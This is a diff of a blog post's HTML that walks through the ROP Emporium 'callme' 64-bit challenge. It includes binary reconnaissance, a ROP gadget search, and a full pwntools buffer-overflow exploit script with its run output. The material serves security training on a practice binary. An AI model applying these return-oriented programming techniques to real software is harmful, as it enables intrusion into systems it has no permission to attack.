@@ -7,13 +7,13 @@ The challenge files can be found here ~&amp;gt; callme"><meta property="og:url" 
 #<a href=/tags/asm/>asm</a>&nbsp;
 #<a href=/tags/pwn/>pwn</a>&nbsp;</span><div class=post-content><div><blockquote><p>&ldquo;Failure is not an option&rdquo;</p></blockquote><h2 id=important-note-->Important note ><a href=#important-note-- class=hanchor arialabel=Anchor>&#8983;</a></h2><p>To dispose of the need for any RE I&rsquo;ll tell you the following
 You must call the callme_one(), callme_two() and callme_three() functions in that order, each with the arguments 0xdeadbeef, 0xcafebabe, 0xd00df00d e.g. callme_one(0xdeadbeef, 0xcafebabe, 0xd00df00d) to print the flag. For the x86_64 binary double up those values, e.g. callme_one(0xdeadbeefdeadbeef, 0xcafebabecafebabe, 0xd00df00dd00df00d)</p><p>The challenge files can be found here ~>
-<a href=https://ropemporium.com/challenge/callme.html>callme</a></p><p>Before getting our hands onto the challenge let&rsquo;s take a look at x86-64 calling conventions</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>+---------+------+------+------+------+------+------+
+<a href=https://ropemporium.com/challenge/callme.html>callme</a></p><p>Before getting our hands onto the challenge let&rsquo;s take a look at x86-64 calling conventions</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>+---------+------+------+------+------+------+------+
 | syscall | arg0 | arg1 | arg2 | arg3 | arg4 | arg5 |
 +---------+------+------+------+------+------+------+
 |   %rax  | %rdi | %rsi | %rdx | %r10 | %r8  | %r9  |
 +---------+------+------+------+------+------+------+
 </code></pre></div><p>To understand calling conventions better take a look here ~>
-<a href=https://en.wikipedia.org/wiki/X86_calling_conventions#System_V_AMD64_ABI>calling convetions</a></p><p>Now lets take a look at the challenge binary</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>callme64 ➤ checksec callme
+<a href=https://en.wikipedia.org/wiki/X86_calling_conventions#System_V_AMD64_ABI>calling convetions</a></p><p>Now lets take a look at the challenge binary</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>callme64 ➤ checksec callme
 <span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> <span style=color:#e6db74>&#39;/home/h4x5p4c3/Documents/pwn/rop_emporium/2-callme/callme64/callme&#39;</span>
     Arch:     amd64-64-little
     RELRO:    Partial RELRO
@@ -21,7 +21,7 @@ You must call the callme_one(), callme_two() and callme_three() functions in tha
     NX:       NX enabled
     PIE:      No PIE <span style=color:#f92672>(</span>0x400000<span style=color:#f92672>)</span>
     RUNPATH:  b<span style=color:#e6db74>&#39;.&#39;</span>
-</code></pre></div><p>This looks similar to the previous challenge we solved</p><p>Lets checkout the functions which are imported from the shared object file</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>callme64 ➤ rabin2 -i callme
+</code></pre></div><p>This looks similar to the previous challenge we solved</p><p>Lets checkout the functions which are imported from the shared object file</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>callme64 ➤ rabin2 -i callme
 <span style=color:#f92672>[</span>Imports<span style=color:#f92672>]</span>
 nth vaddr      bind   type   lib name
 ―――――――――――――――――――――――――――――――――――――
@@ -36,7 +36,7 @@ nth vaddr      bind   type   lib name
 <span style=color:#ae81ff>9</span>   0x00400730 GLOBAL FUNC       setvbuf
 <span style=color:#ae81ff>10</span>  0x00400740 GLOBAL FUNC       callme_two
 <span style=color:#ae81ff>11</span>  0x00400750 GLOBAL FUNC       exit
-</code></pre></div><p>Yes we can see the functions which are need for the exploit let&rsquo;s take a note of them&mldr;..</p><p>Next up let&rsquo;s check the functions present in the binary</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=color:#f92672>[</span>0x00400760<span style=color:#f92672>]</span>&gt; afl
+</code></pre></div><p>Yes we can see the functions which are need for the exploit let&rsquo;s take a note of them&mldr;..</p><p>Next up let&rsquo;s check the functions present in the binary</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=color:#f92672>[</span>0x00400760<span style=color:#f92672>]</span>&gt; afl
 0x00400760    <span style=color:#ae81ff>1</span> <span style=color:#ae81ff>42</span>           entry0
 0x004006a8    <span style=color:#ae81ff>3</span> <span style=color:#ae81ff>23</span>           sym._init
 0x004009b4    <span style=color:#ae81ff>1</span> <span style=color:#ae81ff>9</span>            sym._fini
@@ -59,7 +59,7 @@ nth vaddr      bind   type   lib name
 0x00400790    <span style=color:#ae81ff>1</span> <span style=color:#ae81ff>2</span>            sym._dl_relocate_static_pie
 0x00400847    <span style=color:#ae81ff>1</span> <span style=color:#ae81ff>81</span>           main
 0x00400730    <span style=color:#ae81ff>1</span> <span style=color:#ae81ff>6</span>            sym.imp.setvbuf
-</code></pre></div><p>Again we have a useful function lets take a look at it</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=color:#f92672>[</span>0x00400760<span style=color:#f92672>]</span>&gt; s sym.usefulFunction
+</code></pre></div><p>Again we have a useful function lets take a look at it</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=color:#f92672>[</span>0x00400760<span style=color:#f92672>]</span>&gt; s sym.usefulFunction
 <span style=color:#f92672>[</span>0x004008f2<span style=color:#f92672>]</span>&gt; pdf
 ┌ 74: sym.usefulFunction <span style=color:#f92672>()</span>;
 │           0x004008f2      push rbp
@@ -79,7 +79,7 @@ nth vaddr      bind   type   lib name
 │           0x00400932      mov edi, <span style=color:#ae81ff>1</span>                                 ; int status
 └           0x00400937      call sym.imp.exit                          ; void exit<span style=color:#f92672>(</span>int status<span style=color:#f92672>)</span>
 </code></pre></div><p>From this we can understand we need to pass the values three times and call the functions respectively and
-as per the important note given by the challenge author we can figure out the overview of solving the challenge</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=color:#ae81ff>40</span> bytes to overflow
+as per the important note given by the challenge author we can figure out the overview of solving the challenge</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=color:#ae81ff>40</span> bytes to overflow
 mov rdi, 0xdeadbeefdeadbeef
 mov rsi, 0xcafebabecafebabe
 mov rdx, 0xd00df00dd00df00d
@@ -95,7 +95,7 @@ call callme_three
 </code></pre></div><h2 id=rop-gadgets>ROP gadgets<a href=#rop-gadgets class=hanchor arialabel=Anchor>&#8983;</a></h2><pre><code>amd64 calling convention requires the arguments to a function to reside in
 %rdi, %rsi,  %rdx
 </code></pre><p>To get the values into registers to pass the arguments, we’ll need a gadget that will pop values from the stack into these registers.
-Lets checkout the gadgets now using <code>ropper</code></p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>callme64 ➤ ropper --file callme --search <span style=color:#e6db74>&#39;pop&#39;</span>
+Lets checkout the gadgets now using <code>ropper</code></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>callme64 ➤ ropper --file callme --search <span style=color:#e6db74>&#39;pop&#39;</span>
 <span style=color:#f92672>[</span>INFO<span style=color:#f92672>]</span> Load gadgets from cache
 <span style=color:#f92672>[</span>LOAD<span style=color:#f92672>]</span> loading... 100%
 <span style=color:#f92672>[</span>LOAD<span style=color:#f92672>]</span> removing double gadgets... 100%
@@ -116,11 +116,11 @@ Lets checkout the gadgets now using <code>ropper</code></p><div class=highlight>
 0x00000000004009a1: pop rsi; pop r15; ret;
 0x000000000040093d: pop rsi; pop rdx; ret;
 0x000000000040099d: pop rsp; pop r13; pop r14; pop r15; ret;
-</code></pre></div><p>we have a gadget that satisfies our exact need lets take a note of it <code>0x000000000040093c</code></p><h2 id=exploitation>Exploitation<a href=#exploitation class=hanchor arialabel=Anchor>&#8983;</a></h2><p>Now lets craft our exploit :)</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#75715e>#!/usr/bin/env python3</span>
+</code></pre></div><p>we have a gadget that satisfies our exact need lets take a note of it <code>0x000000000040093c</code></p><h2 id=exploitation>Exploitation<a href=#exploitation class=hanchor arialabel=Anchor>&#8983;</a></h2><p>Now lets craft our exploit :)</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#75715e>#!/usr/bin/env python3</span>
 <span style=color:#f92672>from</span> pwn <span style=color:#f92672>import</span> <span style=color:#f92672>*</span>
 context<span style=color:#f92672>.</span>terminal <span style=color:#f92672>=</span> [<span style=color:#e6db74>&#39;alacritty&#39;</span>, <span style=color:#e6db74>&#39;-e&#39;</span>, <span style=color:#e6db74>&#39;sh&#39;</span>, <span style=color:#e6db74>&#39;-c&#39;</span>]
 context<span style=color:#f92672>.</span>log_level <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;info&#39;</span>
-exe <span style=color:#f92672>=</span> context<span style=color:#f92672>.</span>binary <span style=color:#f92672>=</span> ELF(<span style=color:#e6db74>&#39;./callme&#39;</span>, checksec<span style=color:#f92672>=</span>False)
+exe <span style=color:#f92672>=</span> context<span style=color:#f92672>.</span>binary <span style=color:#f92672>=</span> ELF(<span style=color:#e6db74>&#39;./callme&#39;</span>, checksec<span style=color:#f92672>=</span><span style=color:#66d9ef>False</span>)
 io <span style=color:#f92672>=</span> process(exe<span style=color:#f92672>.</span>path)
 gadget <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x000000000040093c</span> <span style=color:#75715e>#pop rdi; pop rsi; pop rdx; ret</span>
 one <span style=color:#f92672>=</span> <span style=color:#ae81ff>0xdeadbeefdeadbeef</span>
@@ -134,7 +134,7 @@ payload <span style=color:#f92672>=</span> flat([
 ])
 io<span style=color:#f92672>.</span>sendline(payload)
 io<span style=color:#f92672>.</span>interactive()
-</code></pre></div><p>Lets run our exploit to check if it works</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>callme64 ➤ python xpl.py
+</code></pre></div><p>Lets run our exploit to check if it works</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>callme64 ➤ python xpl.py
 <span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Starting local process <span style=color:#e6db74>&#39;./callme&#39;</span>: pid <span style=color:#ae81ff>8013</span>
 <span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Switching to interactive mode
 callme by ROP Emporium
@@ -153,4 +153,5 @@ $
 <span class=button__text>googleCTF Beginner Reversing</span></a></span>
 <span class="button next"><a href=/posts/ropemporium-split-64bit/><span class=button__text>Ropemporium split 64bit</span>
 <span class=button__icon>→</span></a></span></div></div></div></div><footer class=footer><div class=footer__inner><div class="copyright copyright--user"><span>Copyright ©️ 2021</span>
-<span><a href=https://twitter.com/h4x5p4c3>h4x5p4c3</a></span></div></div></footer><script src=/assets/main.js></script><script src=/assets/prism.js></script></div></body></html>
+<span><a href=https://twitter.com/h4x5p4c3>h4x5p4c3</a></span></div></div></footer><script src=/assets/main.js></script>
+<script src=/assets/prism.js></script></div></body></html>
